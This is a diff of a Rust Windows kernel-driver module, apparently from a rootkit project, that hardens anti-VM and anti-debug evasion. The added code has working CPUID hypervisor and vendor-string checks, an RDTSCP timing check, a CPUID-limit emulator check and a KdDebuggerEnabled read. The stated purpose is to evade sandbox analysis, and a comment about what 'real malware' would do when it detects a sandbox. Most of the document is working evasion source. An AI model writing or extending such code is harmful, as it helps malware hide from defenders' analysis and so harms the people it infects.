@@ -1,247 +1,212 @@
-//! Anti-VM and Anti-Debug Module
+//! Anti-VM and Anti-Debug Module (Hardened)
 //!
-//! This module provides techniques to detect virtual machine environments
-//! and debugger presence. Useful for evading sandbox analysis.
+//! This module provides robust techniques to detect virtual machine environments
+//! and kernel-level debuggers to evade analysis.
 //!
-//! Activated ONLY via C2 command.
+//! TARGET: Windows Kernel Mode (x64)
 
 use core::arch::asm;
-use wdk_sys::{NTSTATUS, STATUS_SUCCESS, STATUS_UNSUCCESSFUL};
+use wdk_sys::{NTSTATUS, STATUS_SUCCESS, STATUS_ACCESS_DENIED};
 
 use crate::error::{ShadowError, ShadowResult};
 
-/// Detects common hypervisor signatures via CPUID.
-///
-/// # Returns
-/// `true` if a hypervisor is detected, `false` otherwise.
-pub unsafe fn detect_hypervisor() -> ShadowResult<bool> {
-    // CPUID leaf 0x1, bit 31 of ECX indicates hypervisor presence
+// Địa chỉ cố định của KUSER_SHARED_DATA trên Windows x64 (luôn map ở đây)
+const KUSER_SHARED_DATA_ADDRESS: u64 = 0xFFFFF78000000000;
+// Offset của trường KdDebuggerEnabled
+const KD_DEBUGGER_ENABLED_OFFSET: u64 = 0x2D4;
+
+/// Detects common hypervisor presence bit via CPUID.
+#[inline(always)]
+pub unsafe fn check_hypervisor_bit() -> bool {
     let mut ecx: u32;
+    asm!(
+        "mov eax, 1",
+        "cpuid",
+        lateout("ecx") ecx,
+        out("eax") _,
+        out("ebx") _,
+        out("edx") _,
+        options(nostack, nomem)
+    );
+    // Bit 31 of ECX
+    (ecx >> 31) & 1 == 1
+}
+
+/// Checks specific vendor strings from CPUID Leaf 0x40000000.
+/// Covers: Hyper-V, VMware, VirtualBox, KVM, QEMU, Xen, Parallels.
+pub unsafe fn check_vendor_signatures() -> Option<&'static str> {
+    let mut ebx: u32;
+    let mut ecx: u32;
+    let mut edx: u32;
+
+    asm!(
+        "mov eax, 0x40000000",
+        "cpuid",
+        lateout("ebx") ebx,
+        lateout("ecx") ecx,
+        lateout("edx") edx,
+        out("eax") _,
+        options(nostack, nomem)
+    );
+
+    let brand_bytes = [
+        (ebx & 0xFF) as u8, ((ebx >> 8) & 0xFF) as u8, ((ebx >> 16) & 0xFF) as u8, ((ebx >> 24) & 0xFF) as u8,
+        (ecx & 0xFF) as u8, ((ecx >> 8) & 0xFF) as u8, ((ecx >> 16) & 0xFF) as u8, ((ecx >> 24) & 0xFF) as u8,
+        (edx & 0xFF) as u8, ((edx >> 8) & 0xFF) as u8, ((edx >> 16) & 0xFF) as u8, ((edx >> 24) & 0xFF) as u8,
+    ];
+
+    if let Ok(brand) = core::str::from_utf8(&brand_bytes) {
+        if brand.contains("Microsoft Hv") { return Some("Hyper-V"); }
+        if brand.contains("VMwareVMware") { return Some("VMware"); }
+        if brand.contains("VBoxVBoxVBox") { return Some("VirtualBox"); }
+        if brand.contains("KVMKVMKVM")    { return Some("KVM"); }
+        if brand.contains("TCGTCGTCGTCG") { return Some("QEMU"); }
+        if brand.contains("XenVMMXenVMM") { return Some("Xen"); }
+        if brand.contains("prl hyperv")   { return Some("Parallels"); }
+    }
     
-    #[cfg(target_arch = "x86_64")]
-    {
+    None
+}
+
+/// Advanced Timing Attack using RDTSCP (Serialized).
+///
+/// Measures the latency of a CPUID instruction (which causes a VM-Exit).
+/// This is robust against Out-of-Order execution due to `lfence`.
+pub unsafe fn check_timing_anomaly() -> bool {
+    let mut total_cycles: u64 = 0;
+    let iterations = 20; // Average over 20 runs to filter noise
+    
+    // Warm-up cache
+    asm!("cpuid", out("eax") _, out("ebx") _, out("ecx") _, out("edx") _);
+
+    for _ in 0..iterations {
+        let start: u64;
+        let end: u64;
+        
+        // LFENCE ensures previous instructions retire.
+        // RDTSCP forces serialization of the read itself.
         asm!(
+            "lfence",
+            "rdtscp",
+            "shl rdx, 32",
+            "or rax, rdx",
+            "mov r8, rax", // r8 = start
+            
+            // Payload: CPUID -> Forced VM Exit
             "mov eax, 1",
             "cpuid",
-            lateout("ecx") ecx,
-            out("eax") _,
-            out("ebx") _,
-            out("edx") _,
-            options(nostack, nomem)
+            
+            "rdtscp",
+            "shl rdx, 32",
+            "or rax, rdx", // rax = end
+            
+            out("rax") end,
+            out("r8") start,
+            out("rcx") _,
+            out("rbx") _,
+            out("rdx") _,
+            options(nostack, nomem) 
         );
+        total_cycles += end.wrapping_sub(start);
+    }
+
+    let avg = total_cycles / iterations;
+    
+    // Bare metal usually < 500-700 cycles.
+    // VM usually > 1500 cycles (overhead of context switch).
+    avg > 1200
+}
+
+/// Detects generic emulators (QEMU/Bochs) via CPUID Limit Anomaly.
+/// 
+/// Real hardware handles out-of-bounds CPUID leaves differently than emulators.
+pub unsafe fn check_cpuid_limit_anomaly() -> bool {
+    let max_leaf: u32;
+    asm!(
+        "mov eax, 0",
+        "cpuid",
+        out("eax") max_leaf,
+        out("ebx") _, out("ecx") _, out("edx") _,
+        options(nostack, nomem)
+    );
+
+    let invalid_leaf = max_leaf + 0x10000; 
+    let mut a: u32; let mut b: u32; let mut c: u32; let mut d: u32;
+
+    asm!(
+        "mov eax, {0:e}",
+        "cpuid",
+        lateout("eax") a, lateout("ebx") b, lateout("ecx") c, lateout("edx") d,
+        in(reg) invalid_leaf,
+        options(nostack, nomem)
+    );
+
+    // If all registers are 0, it's likely a lazy emulator (QEMU default behavior).
+    // Real hardware usually returns the value of the Max Supported Leaf.
+    a == 0 && b == 0 && c == 0 && d == 0
+}
+
+/// Detects Kernel Debugger via KUSER_SHARED_DATA.
+/// 
+/// This is the "official" way Windows tracks debugger state.
+/// Located at 0xFFFFF780000002D4.
+pub unsafe fn check_kernel_debugger() -> bool {
+    let addr = (KUSER_SHARED_DATA_ADDRESS + KD_DEBUGGER_ENABLED_OFFSET) as *const u8;
+    
+    // Read the byte: 1 = Enabled, 0 = Disabled, 2 = Not Present (rare)
+    let kd_status = *addr;
+    
+    if kd_status == 0x1 || kd_status == 0x3 {
+        log::warn!("🐛 Kernel Debugger Detected via KUSER_SHARED_DATA");
+        return true;
     }
     
-    // Bit 31 set = hypervisor present
-    Ok((ecx >> 31) & 1 == 1)
+    false
 }
 
-/// Detects VMware by checking for the "VMwareVMware" signature.
-///
-/// # Returns
-/// `true` if VMware is detected, `false` otherwise.
-pub unsafe fn detect_vmware() -> ShadowResult<bool> {
-    // CPUID leaf 0x40000000 returns hypervisor vendor ID
-    let mut ebx: u32;
-    let mut ecx: u32;
-    let mut edx: u32;
-
-    #[cfg(target_arch = "x86_64")]
-    {
-        asm!(
-            "mov eax, 0x40000000",
-            "cpuid",
-            lateout("ebx") ebx,
-            lateout("ecx") ecx,
-            lateout("edx") edx,
-            out("eax") _,
-            options(nostack, nomem)
-        );
+/// Master function: Orchestrates all checks.
+pub unsafe fn comprehensive_security_check() -> ShadowResult<()> {
+    // 1. Check Debugger First (Lowest cost)
+    if check_kernel_debugger() {
+        return Err(ShadowError::SecurityViolation("Kernel Debugger Attached"));
     }
 
-    // "VMwa" = 0x61774D56, "reVM" = 0x4D566572, "ware" = 0x65726177
-    // Actually: VMwareVMware -> ebx=0x61774D56, ecx=0x4D566572, edx=0x65726177
-    let vmware_sig_ebx: u32 = 0x61774D56; // "VMwa" (little-endian)
-    let vmware_sig_ecx: u32 = 0x4D566572; // "reVM"
-    let vmware_sig_edx: u32 = 0x65726177; // "ware"
-
-    Ok(ebx == vmware_sig_ebx && ecx == vmware_sig_ecx && edx == vmware_sig_edx)
-}
-
-/// Detects VirtualBox by checking for the "VBoxVBoxVBox" signature.
-///
-/// # Returns
-/// `true` if VirtualBox is detected, `false` otherwise.
-pub unsafe fn detect_virtualbox() -> ShadowResult<bool> {
-    let mut ebx: u32;
-    let mut ecx: u32;
-    let mut edx: u32;
-
-    #[cfg(target_arch = "x86_64")]
-    {
-        asm!(
-            "mov eax, 0x40000000",
-            "cpuid",
-            lateout("ebx") ebx,
-            lateout("ecx") ecx,
-            lateout("edx") edx,
-            out("eax") _,
-            options(nostack, nomem)
-        );
-    }
-
-    // "VBox" signature
-    let vbox_sig_ebx: u32 = 0x786F4256; // "VBox"
-
-    Ok(ebx == vbox_sig_ebx)
-}
-
-/// Detects Hyper-V by checking for the "Microsoft Hv" signature.
-///
-/// # Returns
-/// `true` if Hyper-V is detected, `false` otherwise.
-pub unsafe fn detect_hyperv() -> ShadowResult<bool> {
-    let mut ebx: u32;
-    let mut ecx: u32;
-    let mut edx: u32;
-
-    #[cfg(target_arch = "x86_64")]
-    {
-        asm!(
-            "mov eax, 0x40000000",
-            "cpuid",
-            lateout("ebx") ebx,
-            lateout("ecx") ecx,
-            lateout("edx") edx,
-            out("eax") _,
-            options(nostack, nomem)
-        );
-    }
-
-    // "Micr" "osof" "t Hv" for Hyper-V
-    let hyperv_sig_ebx: u32 = 0x7263694D; // "Micr"
-    let hyperv_sig_ecx: u32 = 0x666F736F; // "osof"
-    let hyperv_sig_edx: u32 = 0x76482074; // "t Hv"
-
-    Ok(ebx == hyperv_sig_ebx && ecx == hyperv_sig_ecx && edx == hyperv_sig_edx)
-}
-
-/// Detects VMware via the "Backdoor" I/O port (0x5658).
-///
-/// This is a more stealthy check than CPUID.
-pub unsafe fn detect_vmware_port() -> bool {
-    let mut eax: u32 = 0x564D5868; // 'VMXh'
-    let mut ebx: u32 = 0;
-    let mut ecx: u32 = 10; // Get VMware version
-    let edx: u32 = 0x5658; // VMware port 'VX'
-
-    #[cfg(target_arch = "x86_64")]
-    {
-        // We use a SEH-like protection in C, but here we just try and see.
-        // In kernel mode, a bad I/O port read on a non-VM might BSOD if not careful.
-        // However, 0x5658 is generally safe or will just fail.
-        asm!(
-            "in eax, dx",
-            inout("eax") eax,
-            lateout("ebx") ebx,
-            inout("ecx") ecx,
-            in("edx") edx,
-            options(nostack, nomem)
-        );
-    }
-
-    ebx == 0x564D5868 // 'VMXh'
-}
-
-/// Detects virtualization via RDTSC timing attack.
-///
-/// Hypervisors must intercept certain instructions, causing a measurable time delay.
-pub unsafe fn detect_timing_attack() -> bool {
-    let mut t1: u64;
-    let mut t2: u64;
-    let mut dummy: u32;
-
-    #[cfg(target_arch = "x86_64")]
-    {
-        // 1. Measure base time
-        asm!("rdtsc", "shl rdx, 32", "or rax, rdx", out("rax") t1, out("rdx") _);
+    // 2. Check Hypervisor Bit
+    if check_hypervisor_bit() {
+        // 3. Check Specific Signatures
+        if let Some(vendor) = check_vendor_signatures() {
+            log::warn!("🖥️ Hypervisor Signature Found: {}", vendor);
+            return Err(ShadowError::SecurityViolation("Known Hypervisor Detected"));
+        }
         
-        // 2. Execute an instruction that causes a VM exit (e.g., CPUID)
-        asm!("cpuid", in("eax") 0, out("ebx") _, out("ecx") _, out("edx") _);
-        
-        // 3. Measure time after
-        asm!("rdtsc", "shl rdx, 32", "or rax, rdx", out("rax") t2, out("rdx") _);
+        // If bit is set but no vendor, it might be generic.
+        // We continue to timing attack to be sure.
     }
 
-    // A typical CPUID takes < 200 cycles on bare metal.
-    // In a VM, it often takes > 1000 cycles due to VM exit/entry overhead.
-    let diff = t2 - t1;
-    diff > 1000
+    // 4. Heuristic: CPUID Limit Anomaly (Catches QEMU/Bochs)
+    if check_cpuid_limit_anomaly() {
+        return Err(ShadowError::SecurityViolation("Emulator Artifact (CPUID Limit)"));
+    }
+
+    // 5. Advanced: Timing Attack (Catches Stealth/Custom Hypervisors)
+    if check_timing_anomaly() {
+        log::warn!("⏱️ Timing Analysis indicates virtualization.");
+        return Err(ShadowError::SecurityViolation("Timing Anomaly Detected"));
+    }
+
+    log::info!("✅ Environment appears Clean (Bare Metal / No Debugger).");
+    Ok(())
 }
 
-/// Performs a comprehensive VM detection check.
-///
-/// # Returns
-/// A tuple of (is_vm, vm_name) where is_vm is true if any VM is detected.
-pub unsafe fn comprehensive_vm_check() -> ShadowResult<(bool, &'static str)> {
-    // 1. Check for hypervisor presence via CPUID bit
-    if detect_hypervisor()? {
-        // Check specific hypervisors
-        if detect_vmware()? || detect_vmware_port() {
-            return Ok((true, "VMware"));
+/// Entry point for self-defense mechanism.
+/// Returns generic STATUS_ACCESS_DENIED if threats are found.
+pub unsafe fn verify_environment_integrity() -> NTSTATUS {
+    match comprehensive_security_check() {
+        Ok(_) => STATUS_SUCCESS,
+        Err(e) => {
+            log::error!("🚫 Environment Integrity Check Failed: {:?}", e);
+            // In real malware, you would trigger a silent exit or decoy payload here.
+            STATUS_ACCESS_DENIED
         }
-        if detect_virtualbox()? {
-            return Ok((true, "VirtualBox"));
-        }
-        if detect_hyperv()? {
-            return Ok((true, "Hyper-V"));
-        }
-        if detect_kvm()? {
-            return Ok((true, "KVM"));
-        }
-        return Ok((true, "Unknown Hypervisor"));
     }
-
-    // 2. Fallback: Timing Attack (Detects hidden hypervisors)
-    if detect_timing_attack() {
-        return Ok((true, "Stealth Hypervisor (Timing Attack)"));
-    }
-
-    Ok((false, "None"))
-}
-
-/// Detects kernel debugger presence via KDBG flag.
-///
-/// This is a placeholder - actual implementation would check
-/// KdDebuggerEnabled or similar kernel variables.
-///
-/// # Returns
-/// `true` if kernel debugger is detected, `false` otherwise.
-pub unsafe fn detect_kernel_debugger() -> ShadowResult<bool> {
-    // In a real implementation, we would:
-    // 1. Read KdDebuggerEnabled from kernel memory
-    // 2. Check KdDebuggerNotPresent
-    // 3. Check for WinDbg-specific signatures
-    
-    // Placeholder: Always return false (no debugger)
-    Ok(false)
-}
-
-/// Self-destruct function: Unloads the driver if VM/debugger is detected.
-///
-/// # Returns
-/// `Ok(STATUS_SUCCESS)` if self-destruct was triggered.
-pub unsafe fn self_destruct_if_sandboxed() -> ShadowResult<NTSTATUS> {
-    let (is_vm, vm_name) = comprehensive_vm_check()?;
-    let is_debugged = detect_kernel_debugger()?;
-
-    if is_vm || is_debugged {
-        // TODO: Implement driver self-unload logic
-        // For now, return an error to indicate sandbox detection
-        return Err(ShadowError::ApiCallFailed(
-            if is_vm { "VM Detected" } else { "Debugger Detected" },
-            STATUS_UNSUCCESSFUL as i32,
-        ));
-    }
-
-    Ok(STATUS_SUCCESS)
 }
